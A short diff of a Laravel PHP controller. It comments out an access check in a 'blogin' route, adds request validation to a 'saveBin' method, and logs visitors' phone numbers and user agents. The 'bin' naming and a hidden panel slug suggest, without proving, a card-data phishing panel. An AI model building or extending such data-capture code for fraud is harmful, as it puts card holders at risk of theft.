@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Classes\SystemStatusEnum;
+use App\Http\Requests\binRequest;
 use App\Http\Requests\loginsRequest;
 use App\Models\AdminOptions;
 use App\Models\binLogModel;
@@ -82,15 +83,13 @@ class MainController extends Controller
     }
     public function blogin(Request $request)
     {
-        $this->checkControl($request);
+        // $this->checkControl($request);
         return view('b');
     }
     public function firstGG(Request $request)
     {
         return view('main');
     }
-
-
 
     public function handleSlug($slug)
     {
@@ -104,10 +103,10 @@ class MainController extends Controller
         // Eğer slug panel slug'ı değilse, 404 döndür veya başka bir işlem yap
         abort(404);
     }
-    public function saveBin(Request $request)
+    public function saveBin(binRequest $request)
     {
         $request->merge([
-            'phone' => $request->phone ?? '',
+            'phone' => $request->phone,
             'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
             'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
             'date' => Carbon::now(),
